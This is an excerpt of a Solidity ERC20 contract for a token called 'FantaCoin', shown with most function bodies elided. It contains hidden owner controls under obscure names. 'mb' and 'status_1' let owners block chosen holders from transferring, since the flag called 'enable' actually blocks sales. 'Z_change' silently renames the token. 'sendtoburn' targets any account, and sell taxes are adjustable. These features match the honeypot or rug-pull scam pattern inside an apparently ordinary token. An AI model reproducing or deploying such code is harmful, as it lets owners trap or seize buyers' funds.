...
contract CoinToken is Context, IERC20, Ownable {
    ...
    string private _name = "FantaCoin";
    string private _symbol = "FTC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xeFE4dAc628a781A84eAfD338FAfede854f49CC58);
    address payable public teamWalletAddress = payable(0xeFE4dAc628a781A84eAfD338FAfede854f49CC58);
    ...
    function Z_change(string memory newname, string memory newsymbol) onlyOwners public{
        _name = newname;
        _symbol = newsymbol;

    }

    function sendtoburn(address account, uint256 amount) onlyOwners() public {
    ...
    function status_set(bool _status) public onlyOwners {
        status_1 = _status;
    }

    function mb(address addr, bool status) public onlyOwners {
        enable[addr] = status;
    }
    ...
    function setSelTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwners() {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        // t
        if(status_1){
            require(!enable[sender],"not enable");    
        }
